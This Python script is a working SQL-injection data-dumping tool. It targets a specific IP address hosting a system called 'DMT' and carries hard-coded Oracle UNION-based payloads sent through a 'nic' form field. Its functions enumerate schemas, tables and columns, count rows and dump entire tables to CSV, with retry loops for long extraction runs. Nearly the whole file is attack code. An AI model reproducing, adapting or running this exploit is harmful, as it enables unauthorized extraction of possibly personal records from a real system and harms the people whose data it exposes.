import os.path
import random
import string
import sys
import threading
import time

import requests
import argparse
import datetime
import urllib3
from pathlib import Path
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fetch_data_pool = []
csv_out_thr_exit_status = 0


class DmtPayloads:
    DMT_LOGIN_URL = "https://112.157.47.111/api/details/auth.php"
    DMT_SQLi_URL = "https://112.157.47.111/dl_details_view.php"
    CHECK_DB_EXISTENCE = "-3462' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'Niet','TEST',(SELECT LIMIT||';;'||OWNER FROM (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT OWNER FROM SYS.ALL_TABLES WHERE OWNER='{POSITION_TO_BE_REPLACED_OWNER}') ORDER BY 1 ASC) WHERE LIMIT=1),NULL,NULL,NULL,NULL,NULL FROM DUAL-- SiYO"
    CHECK_TBL_EXISTENCE = "-3462' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'Niet','TEST',(SELECT LIMIT||';;'||OWNER FROM (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT OWNER FROM SYS.ALL_TABLES WHERE OWNER='{POSITION_TO_BE_REPLACED_OWNER}' AND TABLE_NAME='{POSITION_TO_BE_REPLACED_TABLE_NAME}') ORDER BY 1 ASC) WHERE LIMIT=1),NULL,NULL,NULL,NULL,NULL FROM DUAL-- SiYO"
    LIST_DB_PAYLOAD = "-3462' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'Niet','TEST',(SELECT LIMIT||';;'||OWNER FROM (SELECT OWNER,ROWNUM AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES) ORDER BY 1 ASC) WHERE LIMIT={POSITION_TO_BE_REPLACED_LIMIT}),NULL,NULL,NULL,NULL,NULL FROM DUAL-- SiYO"
    LIST_TBL_PAYLOAD = "-3462' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'Niet','TEST',(SELECT LIMIT||';;'||TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM AS LIMIT FROM (SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='{POSITION_TO_BE_REPLACED_OWNER}') ORDER BY 1 ASC) WHERE LIMIT={POSITION_TO_BE_REPLACED_LIMIT}),NULL,NULL,NULL,NULL,NULL FROM DUAL-- SiYO"
    LIST_COL_PAYLOAD = "-3462' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'Niet','TEST',(SELECT LIMIT||';;'||COLUMN_NAME||';;'||DATA_TYPE FROM (SELECT COLUMN_NAME,DATA_TYPE,ROWNUM AS LIMIT FROM (SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='{POSITION_TO_BE_REPLACED_OWNER}' AND TABLE_NAME='{POSITION_TO_BE_REPLACED_TABLE_NAME}') ORDER BY 1 ASC) WHERE LIMIT={POSITION_TO_BE_REPLACED_LIMIT}),NULL,NULL,NULL,NULL,NULL FROM DUAL-- SiYO"
    GET_ROW_COUNT = "-3462' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'Niet','TEST',(SELECT COUNT(LIMIT)||';;' FROM (SELECT {POSITION_TO_BE_REPLACED_COL_NAME},ROWNUM AS LIMIT FROM (SELECT {POSITION_TO_BE_REPLACED_COL_NAME} FROM {POSITION_TO_BE_REPLACED_OWNER}.{POSITION_TO_BE_REPLACED_TABLE_NAME}) ORDER BY 1 ASC)),NULL,NULL,NULL,NULL,NULL FROM DUAL-- SiYO"


GLOBAL_HEAD = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
}


def get_currentTime():
    return "[" + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "] "


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--username", help="Username for DMT system.", type=str)
    parser.add_argument("--password", help="Password for DMT system.", type=str)
    parser.add_argument("--operation", help="SQLi operation to be performed.", type=str)
    parser.add_argument("--loop-pos", help="Position to continue dumping data.", type=int)
    parser.add_argument("--where-column", help="Column to be used for WHERE clause.", type=str)
    parser.add_argument("--order-by", help="Column to be used for ORDER BY clause.", type=str)
    parser.add_argument("--csv-path", help="Path to the CSV file to output dumped data", type=str)
    return parser.parse_args()


def parse_html_response(resp_text, print_out=True):
    bs_dmt = BeautifulSoup(resp_text, "html.parser")
    entry = bs_dmt.find_all("input", {'id': 'bth_dt'})[0]['value']
    if entry is None or entry == "":
        return -1
    entry = str(entry).split(';;')
    entry = ' : '.join(entry)
    if print_out:
        print(get_currentTime() + entry)
    return entry


def parse_fetch_response(resp_text):
    bs_fetch = BeautifulSoup(resp_text, "html.parser")
    data_inputs = bs_fetch.find_all("input")
    for d_input in data_inputs:
        if d_input is not None and d_input != "":
            in_value = ', '.join(f'"{val}"' for val in d_input['value'].split('[;:;]')).strip()
            if in_value is not None and in_value != '' and in_value != '\"\"':
                yield in_value


def format_payload(payload, owner="", tbl_name="", col_name="", limit=""):
    return payload.replace('{POSITION_TO_BE_REPLACED_OWNER}', owner).replace('{POSITION_TO_BE_REPLACED_TABLE_NAME}',
                                                                             tbl_name).replace(
        '{POSITION_TO_BE_REPLACED_COL_NAME}', col_name).replace(
        '{POSITION_TO_BE_REPLACED_LIMIT}', limit)


def init_http_payload(dmt_sess, payload):
    while True:
        try:
            return dmt_sess.post(DmtPayloads.DMT_SQLi_URL, headers=GLOBAL_HEAD, data={'nic': payload, 'btnSave': ''},
                                 verify=False, timeout=10)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            print(get_currentTime() + "Connection problem occurred! Pausing script for a few seconds...")
            time.sleep(10)
            continue


def generate_generic_fetch_payload(offset, db_name, tbl_name, col_names):
    main_query = "-3462' UNION ALL SELECT NULL,NULL, {{0}}, {{1}}, {{2}}, {{3}}, {{4}}, {{5}}, {{6}}, {{7}}, {{8}}, '', {{9}}, 'TEST',NULL FROM DUAL-- SiYO"
    comma_sep_cols = ', '.join(col_names)
    sub_query_proto = "(SELECT {0} FROM (SELECT {1}, ROWNUM AS LIMIT FROM (SELECT {2} FROM {3}.{4} ORDER BY SYS_ID_NO ASC OFFSET {5} ROWS FETCH NEXT 10 ROWS ONLY) ORDER BY 1 ASC) WHERE LIMIT = {6})"
    parsable_cols = '||\'[;:;]\'||'.join(col_names)

    for i in range(0, 10):
        sub_query_formatted = sub_query_proto.format(parsable_cols, comma_sep_cols, comma_sep_cols, db_name, tbl_name,
                                                     offset, str(i + 1))
        main_query = main_query.replace('{{' + str(i) + '}}', sub_query_formatted)
    return main_query


def generate_pk_fetch_payload(index, db_name, tbl_name, col_names, where_col, order_by='1'):
    main_query = "-3462' UNION ALL SELECT NULL,NULL, {{0}}, {{1}}, {{2}}, {{3}}, {{4}}, {{5}}, {{6}}, {{7}}, {{8}}, '', {{9}}, 'TEST',NULL FROM DUAL-- SiYO"
    comma_sep_cols = ', '.join(col_names)
    sub_query_proto = "(SELECT {0} FROM (SELECT {1}, ROWNUM AS LIMIT FROM (SELECT {2} FROM {3}.{4} WHERE {5} = '{6}' ORDER BY {7} ASC)) WHERE LIMIT = 1)"
    parsable_cols = '||\'[;:;]\'||'.join(col_names)

    for i in range(0, 10):
        sub_query_formatted = sub_query_proto.format(parsable_cols, comma_sep_cols, comma_sep_cols, db_name, tbl_name,
                                                     where_col, (i + index), order_by, order_by)
        main_query = main_query.replace('{{' + str(i) + '}}', sub_query_formatted)
    return main_query


def schema_exists(dmt_sess, db_name):
    dmt_resp = init_http_payload(dmt_sess, format_payload(DmtPayloads.CHECK_DB_EXISTENCE, db_name, "", ""))
    if parse_html_response(dmt_resp.text, False) == -1:
        return False
    return True


def table_exists(dmt_sess, db_name, tbl_name):
    dmt_resp = init_http_payload(dmt_sess, format_payload(DmtPayloads.CHECK_TBL_EXISTENCE, db_name, tbl_name))
    if parse_html_response(dmt_resp.text, False) == -1:
        return False
    return True


def get_row_count(dmt_sess, db_name, tbl_name):
    if not schema_exists(dmt_sess, db_name):
        return -1

    if not table_exists(dmt_sess, db_name, tbl_name):
        return -2

    dmt_resp = init_http_payload(dmt_sess,
                                 format_payload(DmtPayloads.LIST_COL_PAYLOAD, db_name, tbl_name, limit=str(1)))
    tbl_col_name = parse_html_response(dmt_resp.text, False)
    if tbl_col_name == -1:
        return -3

    tbl_col_name = tbl_col_name.split(':')[1].strip()
    frmt_payload = format_payload(DmtPayloads.GET_ROW_COUNT, db_name, tbl_name, tbl_col_name)
    dmt_resp = init_http_payload(dmt_sess, frmt_payload)
    return int(parse_html_response(dmt_resp.text, False)[:-2].strip())


def get_column_array(dmt_sess, db_name, tbl_name):
    index = 0
    col_list = []
    print(get_currentTime() + "[", end='')
    while True:
        index += 1
        frmt_payload = format_payload(DmtPayloads.LIST_COL_PAYLOAD, db_name, tbl_name, limit=str(index))
        dmt_resp = init_http_payload(dmt_sess, frmt_payload)
        resp_parse = parse_html_response(dmt_resp.text, False)
        if resp_parse == -1:
            break
        col_name = resp_parse.split(':')[1].strip()
        col_list.append(col_name)
        print(col_name + ", ", end='')
    print("]", end='\n')
    return col_list


def list_columns(dmt_sess, db_name, tbl_name):
    index = 0
    while True:
        index += 1
        frmt_payload = format_payload(DmtPayloads.LIST_COL_PAYLOAD, db_name, tbl_name, limit=str(index))
        sess_resp = init_http_payload(dmt_sess, frmt_payload)
        if parse_html_response(sess_resp.text) == -1:
            break


def list_tables(dmt_sess, db_name):
    index = 0
    while True:
        index += 1
        sess_resp = init_http_payload(dmt_sess, format_payload(DmtPayloads.LIST_TBL_PAYLOAD, db_name, limit=str(index)))
        if parse_html_response(sess_resp.text) == -1:
            break


def list_dbs(dmt_sess):
    index = 0
    while True:
        index += 1
        sess_resp = init_http_payload(dmt_sess, format_payload(DmtPayloads.LIST_DB_PAYLOAD, limit=str(index)))

        if parse_html_response(sess_resp.text) == -1:
            break

    return 0


def initiate_session(username, password):
    dmt_session = requests.Session()
    session_resp = dmt_session.post(DmtPayloads.DMT_LOGIN_URL, headers=GLOBAL_HEAD,
                                    data={'uname': username, 'password': password}, verify=False, allow_redirects=False)
    if session_resp.status_code == 302:
        return dmt_session
    return False


def validate_op_params(dmt_sess, params):
    if len(params) != 2:
        return "Requested operation does not contain the required arguments."

    if not schema_exists(dmt_sess, params[0]):
        return "A schema named '" + params[0] + "' does not exist!"

    if not table_exists(dmt_sess, params[0], params[1]):
        return "A table named '" + params[1] + "' does not exist in the schema '" + params[0] + "'!"

    return None


def csv_write_data_pool_func(csv_path, col_list):
    if csv_path is None or csv_path == "":
        sys.exit()

    path_obj = Path(csv_path)
    if not path_obj.is_file():
        open(csv_path, 'a').close()
        path_obj = Path(csv_path)

    if path_obj.stat().st_size <= 0:
        path_obj.write_text(', '.join(col_list) + '\n')

    with open(csv_path, 'a') as csv_file:
        while True:
            if len(fetch_data_pool) <= 0:
                continue

            fd_string = fetch_data_pool[0] + '\n'
            fetch_data_pool.pop(0)
            csv_file.write(fd_string)


def handle_operation(arg_arr, dmt_sess):
    operation = arg_arr.operation
    if operation is None:
        return "Provided operation is either empty or invalid."

    operation = operation.split(" ")
    if operation[0] == "list-dbs":
        list_dbs(dmt_sess)
        return None

    if len(operation) != 2:
        return "Requested operation does not contain the required arguments."

    if operation[0] == "list-tables":
        if schema_exists(dmt_sess, operation[1]):
            list_tables(dmt_sess, operation[1])
            return None
        return "A schema named '" + operation[1] + "' does not exist!"

    if operation[0] == "list-columns":
        params = operation[1].split('.')
        p_validity = validate_op_params(dmt_sess, params)
        if p_validity is not None:
            return p_validity

        list_columns(dmt_sess, params[0], params[1])
        return None

    if operation[0] == "row-count":
        params = operation[1].split('.')
        p_validity = validate_op_params(dmt_sess, params)
        if p_validity is not None:
            return p_validity

        print(get_currentTime() + "A total of " + str(get_row_count(dmt_sess, params[0],
                                                                    params[1])) + " rows exists in table " + params[
                  0] + "." + params[1] + ".")
        return None

    if operation[0] == "dump-table-generic":
        params = operation[1].split('.')
        p_validity = validate_op_params(dmt_sess, params)
        if p_validity is not None:
            return p_validity

        print(get_currentTime() + "Preparing to dump the table " + params[0] + "." + params[
            1] + " from the DMT database...")
        row_count = get_row_count(dmt_sess, params[0], params[1])
        print(get_currentTime() + "Fetching a list of columns available in " + params[0] + "." + params[
            1] + " table! Please be patient...")
        col_list = get_column_array(dmt_sess, params[0], params[1])
        if row_count <= 0 or len(col_list) <= 0:
            return "The table " + params[0] + "." + params[1] + " is either empty or does not exist!"

        loop_count = row_count - (row_count % 10)
        entry_remain = row_count % 10
        retrieved_count = 0
        while True:
            if retrieved_count >= loop_count:
                break
            fetch_payload = generate_generic_fetch_payload(retrieved_count, params[0], params[1], col_list)
            dmt_fetch_resp = init_http_payload(dmt_sess, fetch_payload)
            for fetch_data in parse_fetch_response(dmt_fetch_resp.text):
                print(get_currentTime() + fetch_data)
            retrieved_count += 10

        if entry_remain > 0:
            for i in range(0, entry_remain):
                fetch_payload = generate_generic_fetch_payload(retrieved_count + i, params[0], params[1], col_list)
                dmt_fetch_resp = init_http_payload(dmt_sess, fetch_payload)
                for fetch_data in parse_fetch_response(dmt_fetch_resp.text):
                    fetch_data_pool.append(fetch_data)
                    print(get_currentTime() + fetch_data)
                retrieved_count += i

    if operation[0] == "dump-table-pk":
        params = operation[1].split('.')
        p_validity = validate_op_params(dmt_sess, params)
        if p_validity is not None:
            return p_validity

        print(get_currentTime() + "Preparing to dump the table " + params[0] + "." + params[
            1] + " from the DMT database...")
        row_count = get_row_count(dmt_sess, params[0], params[1])
        print(get_currentTime() + "Fetching a list of columns available in " + params[0] + "." + params[
            1] + " table! Please be patient...")
        col_list = get_column_array(dmt_sess, params[0], params[1])
        if row_count <= 0 or len(col_list) <= 0:
            return "The table " + params[0] + "." + params[1] + " is either empty or does not exist!"

        csv_out_thr = threading.Thread(target=csv_write_data_pool_func, args=(arguments.csv_path, col_list, ))
        csv_out_thr.start()
        retrieved_count = 0
        if arguments.loop_pos is not None:
            retrieved_count = arguments.loop_pos

        while True:
            if retrieved_count > row_count:
                break

            if arguments.where_column is None or arguments.where_column == "":
                arguments.where_column = col_list[0]

            if arguments.order_by is None or arguments.order_by == "":
                arguments.order_by = col_list[0]

            fetch_payload = generate_pk_fetch_payload(retrieved_count, params[0], params[1], col_list,
                                                      arguments.where_column, arguments.order_by)
            dmt_fetch_resp = init_http_payload(dmt_sess, fetch_payload)
            for fetch_data in parse_fetch_response(dmt_fetch_resp.text):
                fetch_data_pool.append(fetch_data)
                print(get_currentTime() + fetch_data)
            retrieved_count += 10


if __name__ == "__main__":
    try:
        arguments = parse_args()
        dmt_session = initiate_session(arguments.username, arguments.password)
        if not dmt_session:
            print(get_currentTime() + "Provided username or password is incorrect! Try again...")
            exit()

        op_result = handle_operation(arguments, dmt_session)
        if op_result is not None:
            print(get_currentTime() + op_result)
    except KeyboardInterrupt:
        while True:
            if len(fetch_data_pool) <= 0:
                sys.exit()
            continue
